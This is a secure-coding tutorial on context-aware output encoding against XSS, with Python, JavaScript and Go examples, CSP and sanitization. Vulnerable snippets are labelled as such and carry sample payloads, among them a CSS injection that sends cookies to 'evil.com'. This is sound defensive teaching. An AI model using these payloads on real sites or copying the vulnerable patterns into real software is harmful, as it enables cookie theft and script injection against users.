---
title: 'Output Encoding'
description: 'Learn context-aware output encoding to prevent XSS, injection attacks, and data leakage.'
---

Output encoding is the counterpart to input validation. While input validation controls what comes into your application, output encoding ensures data is safely rendered in different contexts. The most common vulnerability prevented by proper output encoding is Cross-Site Scripting (XSS).

## The Problem: Context Matters

The same data requires different encoding depending on where it's rendered:

```html
<!-- Same user input, different contexts -->
<p>Hello, USER_INPUT</p>              <!-- HTML context -->
<a href="/search?q=USER_INPUT">Link</a> <!-- URL context -->
<script>var name = 'USER_INPUT';</script> <!-- JavaScript context -->
<style>body { font: USER_INPUT; }</style> <!-- CSS context -->
```

Each context has different dangerous characters and requires different encoding.

## Cross-Site Scripting (XSS) Types

### Reflected XSS

Attack payload is in the request and immediately reflected in the response:

```python
# VULNERABLE
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f"<h1>Results for: {query}</h1>"  # Attacker: <script>alert('XSS')</script>
```

### Stored XSS

Attack payload is stored in the database and served to other users:

```python
# VULNERABLE
@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['comment']
    db.save_comment(comment)  # Stored in database
    return redirect('/comments')  # Served to all visitors
```

### DOM-Based XSS

Vulnerability exists in client-side JavaScript:

```javascript
// VULNERABLE
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name;
```

## Context-Aware Encoding

### HTML Context Encoding

Encode these characters when inserting into HTML element content:

| Character | Encoding |
|-----------|----------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |

```python
import html

# SECURE: Using built-in HTML escaping
def safe_html_output(user_input):
    return f"<p>Hello, {html.escape(user_input)}</p>"

# With a template engine (preferred)
# Jinja2 auto-escapes by default
# {{ user_input }}  <-- automatically escaped
```

### HTML Attribute Encoding

Extra care needed for attributes, especially unquoted ones:

```python
# DANGEROUS: Unquoted attribute
f'<input value={user_input}>'  # Attacker: x onclick=alert(1)

# SAFER: Quoted + escaped
f'<input value="{html.escape(user_input, quote=True)}">'

# SAFEST: Avoid dynamic attributes when possible
```

### URL Encoding

When inserting user input into URLs:

```python
from urllib.parse import quote, urlencode

# Encoding a single value
def safe_url_param(value):
    return quote(value, safe='')  # Encode everything

# Building a query string
def build_search_url(query, page):
    params = urlencode({'q': query, 'page': page})
    return f"/search?{params}"

# DANGEROUS: User input in href without validation
# Could allow javascript: URLs
f'<a href="{user_input}">Click</a>'  # Attacker: javascript:alert(1)

# SECURE: Validate URL scheme
def safe_link(url):
    from urllib.parse import urlparse
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https', ''):
        return '#'  # Block dangerous schemes
    return html.escape(url)
```

### JavaScript Context Encoding

Inserting data into JavaScript requires JSON encoding:

```python
import json

# SECURE: JSON encoding for JavaScript context
@app.route('/page')
def page():
    user_data = {'name': request.args.get('name', '')}
    return f'''
    <script>
        const userData = {json.dumps(user_data)};
        console.log(userData.name);
    </script>
    '''

# In Jinja2, use the tojson filter
# <script>const data = {{ user_data | tojson }};</script>
```

**Never do this:**

```python
# VULNERABLE: String interpolation in JavaScript
f"<script>var name = '{user_input}';</script>"  # Attacker: '; alert('XSS'); //
```

### CSS Context Encoding

Avoid putting user input in CSS when possible:

```python
# DANGEROUS: User input in CSS
f'<div style="color: {user_input}">'  # Attacker: red; background: url(evil.com/steal?cookie=...)

# SAFER: Validate against allowlist
ALLOWED_COLORS = {'red', 'blue', 'green', 'black', 'white'}
def safe_color(color):
    if color.lower() in ALLOWED_COLORS:
        return color.lower()
    return 'black'  # Default safe value
```

## Framework-Level Protection

Modern frameworks provide automatic encoding:

### Python (Flask/Jinja2)

```python
from flask import Flask, render_template
from markupsafe import escape, Markup

app = Flask(__name__)

@app.route('/hello/<name>')
def hello(name):
    # render_template auto-escapes by default
    return render_template('hello.html', name=name)
    
    # Manual escaping if not using templates
    return f"Hello, {escape(name)}!"

# If you need to render raw HTML (be VERY careful)
trusted_html = Markup('<strong>Safe HTML</strong>')
```

### JavaScript (React)

```jsx
// React escapes by default
function Greeting({ name }) {
    return <h1>Hello, {name}</h1>;  // Safe - auto-escaped
}

// DANGEROUS: dangerouslySetInnerHTML bypasses protection
function RawHtml({ content }) {
    // Only use with sanitized content
    return <div dangerouslySetInnerHTML={{ __html: content }} />;
}
```

### Go

```go
package main

import (
    "html/template"
    "net/http"
)

func handler(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    
    // html/template auto-escapes based on context
    tmpl := template.Must(template.New("hello").Parse(
        `<h1>Hello, {{.Name}}!</h1>`))  // Safe
    
    tmpl.Execute(w, struct{ Name string }{name})
}
```

## Content Security Policy (CSP)

CSP is a defense-in-depth mechanism that mitigates XSS even if encoding fails:

```python
# Add CSP header
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "frame-ancestors 'none';"
    )
    return response
```

**Key CSP directives:**
- `default-src 'self'` - Only allow resources from same origin
- `script-src 'self'` - Only allow scripts from same origin (blocks inline scripts)
- `frame-ancestors 'none'` - Prevent clickjacking

## HTML Sanitization for Rich Content

When you need to allow some HTML (e.g., rich text editors):

```python
import bleach

ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a']
ALLOWED_ATTRIBUTES = {'a': ['href', 'title']}

def sanitize_rich_text(html_content):
    """Sanitize user HTML, keeping only safe tags."""
    return bleach.clean(
        html_content,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        strip=True
    )

# Also validate link URLs
def sanitize_with_link_check(html_content):
    def check_url(tag, name, value):
        if tag == 'a' and name == 'href':
            # Only allow http/https links
            if not value.startswith(('http://', 'https://', '/')):
                return False
        return True
    
    return bleach.clean(
        html_content,
        tags=ALLOWED_TAGS,
        attributes={'a': check_url},
        strip=True
    )
```

## Key Takeaways

1. **Context matters** - Different contexts require different encoding
2. **Use framework auto-escaping** - Don't disable it without good reason
3. **Encode on output** - Not on input (you don't know the output context at input time)
4. **Be extra careful with:**
   - `innerHTML` / `dangerouslySetInnerHTML`
   - Template `| safe` / `Markup()` / `{!! !!}` filters
   - URL schemes in `href` attributes
   - User input in JavaScript contexts
5. **Add CSP headers** - Defense in depth
6. **Use sanitization libraries** - For rich text, use proven libraries like bleach or DOMPurify

## Practice Exercise

Identify the XSS vulnerabilities and fix them:

```html
<!-- Template: search_results.html -->
<h1>Search results for: {{ query | safe }}</h1>

<script>
    const searchTerm = '{{ query }}';
    highlightMatches(searchTerm);
</script>

<a href="{{ next_url }}">Next Page</a>

{% for result in results %}
    <div class="result" style="border-color: {{ result.color }}">
        <h2>{{ result.title | safe }}</h2>
        <p>{{ result.description }}</p>
    </div>
{% endfor %}
```

**Hints:**
1. `| safe` filter disables escaping - is it needed?
2. What if `query` contains a quote?
3. What if `next_url` is `javascript:...`?
4. What if `result.color` contains malicious CSS?
